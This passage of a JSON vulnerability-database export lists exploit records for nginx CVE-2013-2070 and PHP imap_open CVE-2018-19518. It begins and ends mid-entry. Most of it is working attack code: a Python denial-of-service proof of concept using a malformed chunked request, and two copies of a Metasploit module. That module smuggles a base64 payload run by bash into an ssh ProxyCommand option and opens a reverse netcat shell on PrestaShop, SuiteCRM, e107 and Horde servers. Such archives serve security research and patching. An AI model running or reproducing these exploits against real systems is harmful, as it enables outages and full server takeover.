packet + 1\r\n     \r\n    con.close()\r\n \r\nprint \"[+] Done!\"\n\n#  0day.today [2018-04-14]  #",
            "cvss": {
                "score": 5.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-20785"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 59824\r\nCVE(CAN) ID: CVE-2013-2070\r\n\r\nNginx\u662fHTTP\u53ca\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u540c\u65f6\u4e5f\u7528\u4f5c\u90ae\u4ef6\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u7531Igor Sysoev\u7f16\u5199\u3002\r\n\r\nNginx 1.1.4 proxy_pass\u6a21\u5757\u5b58\u5728\u8fdc\u7a0b\u7f13\u51b2\u533a\u6ea2\u51fa\u5b89\u5168\u6f0f\u6d1e\u3002\u5982\u679cHTTP\u540e\u7aef\u8fd4\u56de\u7279\u5236\u7684\u54cd\u5e94\uff0cproxy_pass\u6a21\u5757\u4f1a\u5c06\u5de5\u4f5c\u8fdb\u7a0b\u5185\u5b58\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u9020\u6210\u62d2\u7edd\u670d\u52a1\uff0c\u4e5f\u53ef\u4ee5\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u3002\r\n0\r\nIgor Sysoev nginx 1.1.19\r\nIgor Sysoev nginx 1.1.17\r\nIgor Sysoev nginx 1.0.9\r\nIgor Sysoev nginx 1.0.8\r\nIgor Sysoev nginx 1.0.15\r\nIgor Sysoev nginx 1.0.14\r\nIgor Sysoev nginx 1.0.10\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nIgor Sysoev\r\n-----------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://nginx.org/en/download.html\r\nhttp://nginx.org/download/nginx-1.2.9.tar.gz\r\nhttp://nginx.org/download/nginx-1.2.9.zip",
            "modified": "2013-05-17T00:00:00",
            "published": "2013-05-17T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60786",
            "id": "SSV:60786",
            "title": "Nginx proxy_pass\u6a21\u5757\u8fdc\u7a0b\u5b89\u5168\u6f0f\u6d1e(CVE-2013-2070)",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 5.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60786"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2013-05-17T00:00:00",
            "published": "2013-05-17T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60801",
            "id": "SSV:60801",
            "title": "nginx 1.3.9-1.4.0 DoS PoC",
            "type": "seebug",
            "sourceData": "\n                                                #!/usr/bin/env python\r\n# Exploit Title: nginx v1.3.9-1.4.0 DOS POC (CVE-2013-2070)\r\n# Google Dork: CVE-2013-2070\r\n# Date: 16.05.2013\r\n# Exploit Author: Mert SARICA - mert [ . ] sarica [ @ ] gmail [ . ] com - http://www.mertsarica.com\r\n# Vendor Homepage: http://nginx.org/\r\n# Software Link: http://nginx.org/download/nginx-1.4.0.tar.gz\r\n# Version: 1.3.9-1.4.0\r\n# Tested on: Kali Linux &amp; nginx v1.4.0\r\n# CVE : CVE-2013-2070\r\n\r\nimport httplib\r\nimport time\r\nimport socket\r\nimport sys\r\nimport os\r\n\r\n# Vars &amp; Defs\r\ndebug = 0\r\ndos_packet = 0xFFFFFFFFFFFFFFEC\r\nsocket.setdefaulttimeout(1)\r\n\r\npacket = 0\r\n\r\ndef chunk(data, chunk_size):\r\n    chunked = &quot;&quot;\r\n    chunked += &quot;%s\\r\\n&quot; % (chunk_size)\r\n    chunked += &quot;%s\\r\\n&quot; % (data)\r\n    chunked += &quot;0\\r\\n\\r\\n&quot;\r\n    return chunked\r\n\r\nif sys.platform == 'linux-i386' or sys.platform == 'linux2':\r\n        os.system(&quot;clear&quot;)\r\nelif sys.platform == 'win32':\r\n        os.system(&quot;cls&quot;)\r\nelse:\r\n        os.system(&quot;cls&quot;)\r\n                \r\nprint &quot;======================================================================&quot;\r\nprint u&quot;nginx v1.3.9-1.4.0 DOS POC (CVE-2013-2070) [http://www.mertsarica.com]&quot;\r\nprint &quot;======================================================================&quot;\r\n\r\nif len(sys.argv) &lt; 2:\r\n        print &quot;Usage: python nginx_dos.py [target ip]\\n&quot;\r\n        print &quot;Example: python nginx_dos.py 127.0.0.1\\n&quot;\r\n        sys.exit(1)\r\nelse:\r\n    host = sys.argv[1].lower()\r\n        \r\nwhile packet &lt;= 5:\r\n\r\n    body = &quot;Mert SARICA&quot;\r\n    chunk_size = hex(dos_packet + 1)[3:]\r\n    chunk_size = (&quot;F&quot; + chunk_size[:len(chunk_size)-1]).upper()\r\n\r\n    if debug:\r\n        print &quot;data length:&quot;, len(body), &quot;chunk size:&quot;, chunk_size[:len(chunk_size)]\r\n\r\n    try:\r\n        con = httplib.HTTPConnection(host)\r\n        url = &quot;/mertsarica.php&quot;\r\n        con.putrequest('POST', url)\r\n        con.putheader('User-Agent', &quot;curl/7.30.0&quot;)\r\n        con.putheader('Accept', &quot;*/*&quot;)\r\n        con.putheader('Transfer-Encoding', 'chunked')\r\n        con.putheader('Content-Type', &quot;application/x-www-form-urlencoded&quot;)\r\n        con.endheaders()\r\n        con.send(chunk(body, chunk_size[:len(chunk_size)]))\r\n    except:\r\n        print &quot;Connection error!&quot;\r\n        sys.exit(1)\r\n        \r\n    try:\r\n        resp = con.getresponse()\r\n        print(resp.status, resp.reason)\r\n    except:\r\n        print &quot;[*] Knock knock, is anybody there ? (&quot; + str(packet) + &quot;/5)&quot;\r\n\r\n    packet = packet + 1\r\n    \r\n    con.close()\r\n\r\nprint &quot;[+] Done!&quot;\n                              ",
            "cvss": {
                "score": 5.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60801"
        }
    ],
    "CVE-2018-19518": [
        {
            "bulletinFamily": "exploit",
            "description": "The imap_open function within php, if called without the /norsh flag, will attempt to preauthenticate an IMAP session. On Debian based systems, including Ubuntu, rsh is mapped to the ssh binary. Ssh's ProxyCommand option can be passed from imap_open to execute arbitrary commands. While many custom applications may use imap_open, this exploit works against the following applications: e107 v2, prestashop, SuiteCRM, as well as Custom, which simply prints the exploit strings for use. Prestashop exploitation requires the admin URI, and administrator credentials. suiteCRM/e107 require administrator credentials. Fixed in php 5.6.39.\n",
            "modified": "2019-01-19T00:43:45",
            "published": "2018-11-19T02:28:19",
            "id": "MSF:EXPLOIT/LINUX/HTTP/PHP_IMAP_OPEN_RCE",
            "href": "",
            "type": "metasploit",
            "title": "php imap_open Remote Code Execution",
            "sourceData": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'php imap_open Remote Code Execution',\n      'Description'     => %q{\n        The imap_open function within php, if called without the /norsh flag, will attempt to preauthenticate an\n        IMAP session.  On Debian based systems, including Ubuntu, rsh is mapped to the ssh binary.  Ssh's ProxyCommand\n        option can be passed from imap_open to execute arbitrary commands.\n        While many custom applications may use imap_open, this exploit works against the following applications:\n        e107 v2, prestashop, SuiteCRM, as well as Custom, which simply prints the exploit strings for use.\n        Prestashop exploitation requires the admin URI, and administrator credentials.\n        suiteCRM/e107 require administrator credentials.  Fixed in php 5.6.39.\n      },\n      'Author' =>\n        [\n          'Anton Lopanitsyn', # Vulnerability discovery and PoC\n          'Twoster', # Vulnerability discovery and PoC\n          'h00die', # Metasploit Module\n          'Paolo Serracino', # Horde IMP EDB\n          'Pietro Minniti', # Horde IMP EDB\n          'Damiano Proietti' # Horde IMP EDB\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          [ 'URL', 'https://web.archive.org/web/20181118213536/https://antichat.com/threads/463395' ],\n          [ 'URL', 'https://github.com/Bo0oM/PHP_imap_open_exploit' ],\n          [ 'EDB', '45865'],\n          # This claims all versions of Horde IMP are vuln, but only H3 (~2012) and possibly older are vuln.\n          [ 'EDB', '46136'],\n          [ 'URL', 'https://bugs.php.net/bug.php?id=76428'],\n          [ 'CVE', '2018-19518'],\n          [ 'CVE', '2018-1000859']\n        ],\n      'Privileged'  => false,\n      'Platform'  => [ 'unix' ],\n      'Arch'  => ARCH_CMD,\n      'Targets' =>\n        [\n          [ 'prestashop', {} ],\n          [ 'suitecrm', {}],\n          [ 'e107v2', {'WfsDelay' => 90}], # may need to wait for cron\n          [ 'Horde IMP H3', {}],\n          [ 'custom', {'WfsDelay' => 300}]\n        ],\n      'PrependFork' => true,\n      'DefaultOptions' =>\n        {\n          'PAYLOAD' => 'cmd/unix/reverse_netcat',\n          'WfsDelay' => 120\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => 'Oct 23 2018'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base directory path\", '/admin2769gx8k3']),\n        OptString.new('USERNAME', [ false, \"Username to authenticate with\", '']),\n        OptString.new('PASSWORD', [ false, \"Password to authenticate with\", ''])\n      ])\n  end\n\n  def check\n    if target.name =~ /prestashop/\n      uri = normalize_uri(target_uri.path)\n      res = send_request_cgi({'uri' => uri})\n      if res && (res.code == 301 || res.code == 302)\n        return CheckCode::Detected\n      end\n    elsif target.name =~ /suitecrm/\n      #login page GET /index.php?action=Login&module=Users\n      vprint_status('Loading login page')\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'vars_get' => {\n          'action' => 'Login',\n          'module' => 'Users'\n        }\n      )\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n\n      if res.code = 200\n        return CheckCode::Detected\n      end\n    elsif target.name =~ /Horde IMP H3/\n      res = send_request_cgi({'uri' => normalize_uri(target_uri.path, 'imp', 'test.php')})\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n      major, minor = res.body.scan(/PHP Major Version: (?<major>5\\.[1-6]{1})<\\/li>\\s+<li>PHP Minor Version: (?<minor>[\\d]?\\d)/).flatten\n      phpversion = \"#{major}.#{minor}\"\n      if res.code == 200 && res.body =~ /PHP Mail Server Support Test/ && phpversion != '.'\n        if Gem::Version.new(phpversion) < Gem::Version.new('5.6.39')\n          vprint_good(\"PHP Version #{phpversion} is vulnerable\")\n          return CheckCode::Appears\n        else\n          vprint_bad(\"PHP Version #{phpversion} is NOT vulnerable, patched in 5.6.39.\")\n        end\n      end\n    end\n  CheckCode::Safe\n  end\n\n  def command(spaces='$IFS$()')\n    #payload is base64 encoded, and stuffed into the SSH option.\n    enc_payload = Rex::Text.encode_base64(payload.encoded)\n    command = \"-oProxyCommand=`echo #{enc_payload}|base64 -d|bash`\"\n    #final payload can not contain spaces, however $IFS$() will return the space we require\n    command.gsub!(' ', spaces)\n  end\n\n  def exploit\n    if target.name =~ /prestashop/\n      uri = normalize_uri(target_uri.path)\n      res = send_request_cgi({'uri' => uri})\n      if res && res.code != 301\n        print_error('Admin redirect not found, check URI.  Should be something similar to /admin2769gx8k3')\n        return\n      end\n\n      #There are a bunch of redirects that happen, so we automate going through them to get to the login page.\n      while res.code == 301 || res.code == 302\n        cookie = res.get_cookies\n        uri = res.headers['Location']\n        vprint_status(\"Redirected to #{uri}\")\n        res = send_request_cgi({'uri' => uri})\n      end\n\n      #Tokens are generated for each URL or sub-component, we need valid ones!\n      /.*token=(?<token>\\w{32})/ =~ uri\n      /id=\"redirect\" value=\"(?<redirect>.*)\"\\/>/ =~ res.body\n      cookie = res.get_cookies\n\n      unless token && redirect\n        print_error('Unable to find token and redirect URL, check options.')\n        return\n      end\n\n      vprint_status(\"Token: #{token} and Login Redirect: #{redirect}\")\n      print_status(\"Logging in with #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n      res = send_request_cgi(\n        'method' => 'POST',\n        'uri'    => normalize_uri(target_uri.path, 'index.php'),\n        'cookie' => cookie,\n        'vars_post' => {\n          'ajax' => 1,\n          'token' => '',\n          'controller' => 'AdminLogin',\n          'submitLogin' => '1',\n          'passwd' => datastore['PASSWORD'],\n          'email' => datastore['USERNAME'],\n          'redirect' => redirect\n        },\n        'vars_get' => {\n          'rand' => '1542582364810' #not sure if this will hold true forever, I didn't see where it is being generated\n        }\n      )\n      if res && res.body.include?('Invalid password')\n        print_error('Invalid Login')\n        return\n      end\n      vprint_status(\"Login JSON Response: #{res.body}\")\n      uri = JSON.parse(res.body)['redirect']\n      cookie = res.get_cookies\n      print_good('Login Success, loading admin dashboard to pull tokens')\n      res = send_request_cgi({'uri' => uri, 'cookie' => cookie})\n\n      /AdminCustomerThreads&amp;token=(?<token>\\w{32})/ =~ res.body\n      vprint_status(\"Customer Threads Token: #{token}\")\n      res = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'cookie' => cookie,\n        'vars_get' => {\n          'controller' => 'AdminCustomerThreads',\n          'token' => token\n        }\n      })\n\n      /form method=\"post\" action=\"index\\.php\\?controller=AdminCustomerThreads&amp;token=(?<token>\\w{32})/ =~ res.body\n      print_good(\"Sending Payload with Final Token: #{token}\")\n      data = Rex::MIME::Message.new\n      data.add_part('1', nil, nil, 'form-data; name=\"PS_CUSTOMER_SERVICE_FILE_UPLOAD\"')\n      data.add_part(\"Dear Customer,\\n\\nRegards,\\nCustomer service\", nil, nil, 'form-data; name=\"PS_CUSTOMER_SERVICE_SIGNATURE_1\"')\n      data.add_part(\"x #{command}}\", nil, nil, 'form-data; name=\"PS_SAV_IMAP_URL\"')\n      data.add_part('143', nil, nil, 'form-data; name=\"PS_SAV_IMAP_PORT\"')\n      data.add_part(Rex::Text.rand_text_alphanumeric(8), nil, nil, 'form-data; name=\"PS_SAV_IMAP_USER\"')\n      data.add_part(Rex::Text.rand_text_alphanumeric(8), nil, nil, 'form-data; name=\"PS_SAV_IMAP_PWD\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_DELETE_MSG\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_CREATE_THREADS\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_POP3\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_NORSH\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_SSL\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_VALIDATE-CERT\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_NOVALIDATE-CERT\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_TLS\"')\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_NOTLS\"')\n      data.add_part('', nil, nil, 'form-data; name=\"submitOptionscustomer_thread\"')\n\n      send_request_cgi(\n        'method' => 'POST',\n        'uri'    => normalize_uri(target_uri.path, 'index.php'),\n        'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\n        'data'   => data.to_s,\n        'cookie' => cookie,\n        'vars_get' => {\n          'controller' => 'AdminCustomerThreads',\n          'token' => token\n        }\n      )\n      print_status('IMAP server change left on server, manual revert required.')\n\n      if res && res.body.include?('imap Is Not Installed On This Server')\n        print_error('PHP IMAP mod not installed/enabled ')\n      end\n    elsif target.name =~ /suitecrm/\n      #login page GET /index.php?action=Login&module=Users\n      vprint_status('Loading login page')\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'vars_get' => {\n          'action' => 'Login',\n          'module' => 'Users'\n        }\n      )\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n\n      if res.code = 200\n        cookie = res.get_cookies\n      else\n        print_error(\"HTTP code #{res.code} found, check options.\")\n        return\n      end\n\n      vprint_status(\"Logging in as #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n      res = send_request_cgi(\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'cookie' => cookie,\n        'vars_post' => {\n          'module' => 'Users',\n          'action' => 'Authenticate',\n          'return_module' => 'Users',\n          'return_action' => 'Login',\n          'cant_login' => '',\n          'login_module' => '',\n          'login_action' => '',\n          'login_record' => '',\n          'login_token' => '',\n          'login_oauth_token' => '',\n          'login_mobile' => '',\n          'user_name' => datastore['USERNAME'],\n          'username_password' => datastore['PASSWORD'],\n          'Login' => 'Log+In'\n        }\n      )\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n\n      if res.code = 302\n        cookie = res.get_cookies\n        print_good('Login Success')\n      else\n        print_error('Failed Login, check options.')\n      end\n\n      #load the email settings page to get the group_id\n      vprint_status('Loading InboundEmail page')\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'cookie' => cookie,\n        'vars_get' => {\n          'module' => 'InboundEmail',\n          'action' => 'EditView'\n        }\n      )\n\n      unless res\n        print_error('Error loading site.')\n        return\n      end\n\n      /\"group_id\" value=\"(?<group_id>\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12})\">/ =~ res.body\n\n      unless group_id\n        print_error('Could not identify group_id from form page')\n        return\n      end\n\n      print_good(\"Sending payload with group_id #{group_id}\")\n\n      referer = \"http://#{datastore['RHOST']}#{normalize_uri(target_uri.path, 'index.php')}?module=InboundEmail&action=EditView\"\n      res = send_request_cgi(\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'cookie' => cookie,\n        #required to prevent CSRF protection from triggering\n        'headers' => { 'Referer' => referer},\n        'vars_post' => {\n          'module' => 'InboundEmail',\n          'record' => '',\n          'origin_id' => '',\n          'isDuplicate' => 'false',\n          'action' => 'Save',\n          'group_id' => group_id,\n          'return_module' => '',\n          'return_action' => '',\n          'return_id' => '',\n          'personal' => '',\n          'searchField' => '',\n          'mailbox_type' => '',\n          'button' => '  Save  ',\n          'name' => Rex::Text.rand_text_alphanumeric(8),\n          'status' => 'Active',\n          'server_url' => \"x #{command}}\",\n          'email_user' => Rex::Text.rand_text_alphanumeric(8),\n          'protocol' => 'imap',\n          'email_password' => Rex::Text.rand_text_alphanumeric(8),\n          'port' => '143',\n          'mailbox' => 'INBOX',\n          'trashFolder' => 'TRASH',\n          'sentFolder' => '',\n          'from_name' => Rex::Text.rand_text_alphanumeric(8),\n          'is_auto_import' => 'on',\n          'from_addr' => \"#{Rex::Text.rand_text_alphanumeric(8)}@#{Rex::Text.rand_text_alphanumeric(8)}.org\",\n          'reply_to_name' => '',\n          'distrib_method' => 'AOPDefault',\n          'distribution_user_name' => '',\n          'distribution_user_id' => '',\n          'distribution_options[0]' => 'all',\n          'distribution_options[1]' => '',\n          'distribution_options[2]' => '',\n          'create_case_template_id' => '',\n          'reply_to_addr' => '',\n          'template_id' => '',\n          'filter_domain' => '',\n          'email_num_autoreplies_24_hours' => '10',\n          'leaveMessagesOnMailServer' => '1'\n        }\n      )\n      if res && res.code == 200\n        print_error('Triggered CSRF protection, may try exploitation manually.')\n      end\n      print_status('IMAP server config left on server, manual removal required.')\n    elsif target.name =~ /Horde IMP H3/\n      # The original EDB module claims \"Version: All IMP versions\", however the current\n      # major branch https://github.com/horde/imp/tree/74e3f5fdbac31dfcff15195832c1b9b888767982\n      # does not include any reference to imap_open, nor 'test.php' in the root directory.\n      # H5 (current) uses the IMP test url: /horde/test.php?app=imp with \"Mail Server Support Test\"\n      #    as the header:\n      #    https://github.com/horde/imp/blob/16400fd5f52610d27d59d21fe2e39db2c85837f1/lib/Test.php#L85\n      # H3 (~2012) uses the IMP test url: /horde/imp/test.php and \"PHP Mail Server Support Test\"\n      #    which are the values coded into the python edb exploit.\n      print_status(\"Sending Exploit Request\")\n      res = send_request_cgi(\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'imp', 'test.php'),\n        'vars_post' => {\n          'f_submit'    => 'Submit',\n          'passwd'      => Rex::Text.rand_text_alphanumeric(8),\n          'port'        => '143',\n          'server'      => \"x #{command}}\",\n          'server_type' => 'imap',\n          'user'        => Rex::Text.rand_text_alphanumeric(8)\n      })\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n    elsif target.name =~ /e107v2/\n      # e107 has an encoder which prevents $IFS$() from being used as $ = &#036;\n      # \\t also became /t, however \"\\t\" does seem to work.\n\n      # e107 also uses a cron job to check bounce jobs, which may not be active.\n      # either cron can be disabled, or bounce checks disabled, so we try to\n      # kick the process manually, however if it doesn't work we'll hope\n      # cron is running and we get a call back anyways.\n\n      vprint_status(\"Logging in as #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n      res = send_request_cgi(\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'e107_admin', 'admin.php'),\n        'vars_post' => {\n          'authname' => datastore['USERNAME'],\n          'authpass' => datastore['PASSWORD'],\n          'authsubmit' => 'Log In'\n      })\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n\n      if res.code == 302\n        cookie = res.get_cookies\n        print_good('Login Success')\n      else\n        print_error('Failed Login, check options.')\n      end\n\n      vprint_status('Checking if Cron is enabled for triggering')\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'e107_admin', 'cron.php'),\n        'cookie' => cookie\n      )\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n      if res.body.include? 'Status: <b>Disabled</b>'\n        print_error('Cron disabled, unexploitable.')\n        return\n      end\n\n      print_good('Storing payload in mail settings')\n\n      # the imap/pop field is hard to find. Check Users > Mail\n      # then check \"Bounced emails - Processing method\" and set it to \"Mail account\"\n      send_request_cgi(\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'e107_admin', 'mailout.php'),\n        'cookie' => cookie,\n        'vars_get' => {\n          'mode' => 'prefs',\n          'action' => 'prefs'\n        },\n        'vars_post' => {\n          'testaddress' => 'none@none.com',\n          'testtemplate' => 'textonly',\n          'bulkmailer' => 'smtp',\n          'smtp_server' => '1.1.1.1',\n          'smtp_username' => 'username',\n          'smtp_password' => 'password',\n          'smtp_port' => '25',\n          'smtp_options' => '',\n          'smtp_keepalive' => '0',\n          'smtp_useVERP' => '0',\n          'mail_sendstyle' => 'texthtml',\n          'mail_pause' => '3',\n          'mail_pausetime' => '4',\n          'mail_workpertick' => '5',\n          'mail_log_option' => '0',\n          'mail_bounce' => 'mail',\n          'mail_bounce_email2' => '',\n          'mail_bounce_email' => \"#{Rex::Text.rand_text_alphanumeric(8)}@#{Rex::Text.rand_text_alphanumeric(8)}.org\",\n          'mail_bounce_pop3' => \"x #{command(\"\\t\")}}\",\n          'mail_bounce_user' => Rex::Text.rand_text_alphanumeric(8),\n          'mail_bounce_pass' => Rex::Text.rand_text_alphanumeric(8),\n          'mail_bounce_type' => 'imap',\n          'mail_bounce_auto' => '1',\n          'updateprefs' => 'Save Changes'\n      })\n\n\n      vprint_status('Loading cron page to execute job manually')\n      res =  send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'e107_admin', 'cron.php'),\n        'cookie' => cookie\n      )\n\n      unless res\n        print_error('Error loading site.  Check options.')\n        return\n      end\n\n      if /name='e-token' value='(?<etoken>\\w{32})'/ =~ res.body && /_system::procEmailBounce.+?cron_execute\\[(?<cron_id>\\d)\\]/m =~ res.body\n        print_good(\"Triggering manual run of mail bounch check cron to execute payload with cron id #{cron_id} and etoken #{etoken}\")\n        # The post request has several duplicate columns, however all were not required.  Left them commented for documentation purposes\n        send_request_cgi(\n          'method' => 'POST',\n          'uri' => normalize_uri(target_uri.path, 'e107_admin', 'cron.php'),\n          'cookie' => cookie,\n          'vars_post' => {\n            'e-token' => etoken,\n            #'e-columns[]' => 'cron_category',\n            'e-columns[]' => 'cron_name',\n            #'e-columns[]' => 'cron_description',\n            #'e-columns[]' => 'cron_function',\n            #'e-columns[]' => 'cron_tab',\n            #'e-columns[]' => 'cron_lastrun',\n            #'e-columns[]' => 'cron_active',\n            \"cron_execute[#{cron_id}]\" => '1',\n            'etrigger_batch' => ''\n        })\n\n      else\n        print_error('e-token not found, required for manual exploitation.  Wait 60sec, cron may still trigger.')\n      end\n\n      print_status('IMAP server config left on server, manual removal required.')\n    elsif target.name =~ /custom/\n      print_status('Listener started for 300 seconds')\n      print_good(\"POST request connection string: x #{command}}\")\n      # URI.encode leaves + as + since that's a space encoded.  So we manually change it.\n      print_good(\"GET request connection string: #{URI.encode(\"x \" + command + \"}\").sub! '+', '%2B'}\")\n    end\n  end\nend\n",
            "cvss": {
                "score": 8.5,
                "vector": "AV:N/AC:M/Au:S/C:C/I:C/A:C"
            },
            "vhref": "https://vulners.com/metasploit/MSF:EXPLOIT/LINUX/HTTP/PHP_IMAP_OPEN_RCE"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2018-11-29T00:00:00",
            "published": "2018-11-29T00:00:00",
            "id": "EDB-ID:45914",
            "href": "https://www.exploit-db.com/exploits/45914",
            "type": "exploitdb",
            "title": "PHP imap_open - Remote Code Execution (Metasploit)",
            "sourceData": "##\r\n# This module requires Metasploit: https://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = GoodRanking\r\n\r\n  include Msf::Exploit::Remote::HttpClient\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      'Name'            => 'php imap_open Remote Code Execution',\r\n      'Description'     => %q{\r\n        The imap_open function within php, if called without the /norsh flag, will attempt to preauthenticate an\r\n        IMAP session.  On Debian based systems, including Ubuntu, rsh is mapped to the ssh binary.  Ssh's ProxyCommand\r\n        option can be passed from imap_open to execute arbitrary commands.\r\n        While many custom applications may use imap_open, this exploit works against the following applications:\r\n        e107 v2, prestashop, SuiteCRM, as well as Custom, which simply prints the exploit strings for use.\r\n        Prestashop exploitation requires the admin URI, and administrator credentials.\r\n        suiteCRM/e107/hostcms require administrator credentials.\r\n      },\r\n      'Author' =>\r\n        [\r\n          'Anton Lopanitsyn', # Vulnerability discovery and PoC\r\n          'Twoster', # Vulnerability discovery and PoC\r\n          'h00die' # Metasploit Module\r\n        ],\r\n      'License'         => MSF_LICENSE,\r\n      'References'      =>\r\n        [\r\n          [ 'URL', 'https://web.archive.org/web/20181118213536/https://antichat.com/threads/463395' ],\r\n          [ 'URL', 'https://github.com/Bo0oM/PHP_imap_open_exploit' ],\r\n          [ 'EDB', '45865'],\r\n          [ 'URL', 'https://bugs.php.net/bug.php?id=76428'],\r\n          [ 'CVE', '2018-19518']\r\n        ],\r\n      'Privileged'  => false,\r\n      'Platform'  => [ 'unix' ],\r\n      'Arch'  => ARCH_CMD,\r\n      'Targets' =>\r\n        [\r\n          [ 'prestashop', {} ],\r\n          [ 'suitecrm', {}],\r\n          [ 'e107v2', {'WfsDelay' => 90}], # may need to wait for cron\r\n          [ 'custom', {'WfsDelay' => 300}]\r\n        ],\r\n      'PrependFork' => true,\r\n      'DefaultOptions' =>\r\n        {\r\n          'PAYLOAD' => 'cmd/unix/reverse_netcat',\r\n          'WfsDelay' => 120\r\n        },\r\n      'DefaultTarget'  => 0,\r\n      'DisclosureDate' => 'Oct 23 2018'))\r\n\r\n    register_options(\r\n      [\r\n        OptString.new('TARGETURI', [ true, \"Base directory path\", '/admin2769gx8k3']),\r\n        OptString.new('USERNAME', [ false, \"Username to authenticate with\", '']),\r\n        OptString.new('PASSWORD', [ false, \"Password to authenticate with\", ''])\r\n      ])\r\n  end\r\n\r\n  def check\r\n   if target.name =~ /prestashop/\r\n      uri = normalize_uri(target_uri.path)\r\n      res = send_request_cgi({'uri' => uri})\r\n      if res && (res.code == 301 || res.code == 302)\r\n       return CheckCode::Detected\r\n      end\r\n    elsif target.name =~ /suitecrm/\r\n      #login page GET /index.php?action=Login&module=Users\r\n      vprint_status('Loading login page')\r\n      res = send_request_cgi(\r\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\r\n        'vars_get' => {\r\n          'action' => 'Login',\r\n          'module' => 'Users'\r\n        }\r\n      )\r\n      unless res\r\n        print_error('Error loading site.  Check options.')\r\n        return\r\n      end\r\n\r\n      if res.code = 200\r\n        return CheckCode::Detected\r\n      end\r\n   end\r\n   CheckCode::Safe\r\n  end\r\n\r\n  def command(spaces='$IFS$()')\r\n    #payload is base64 encoded, and stuffed into the SSH option.\r\n    enc_payload = Rex::Text.encode_base64(payload.encoded)\r\n    command = \"-oProxyCommand=`echo #{enc_payload}|base64 -d|bash`\"\r\n    #final payload can not contain spaces, however $IFS$() will return the space we require\r\n    command.gsub!(' ', spaces)\r\n  end\r\n\r\n  def exploit\r\n    if target.name =~ /prestashop/\r\n      uri = normalize_uri(target_uri.path)\r\n      res = send_request_cgi({'uri' => uri})\r\n      if res && res.code != 301\r\n        print_error('Admin redirect not found, check URI.  Should be something similar to /admin2769gx8k3')\r\n        return\r\n      end\r\n\r\n      #There are a bunch 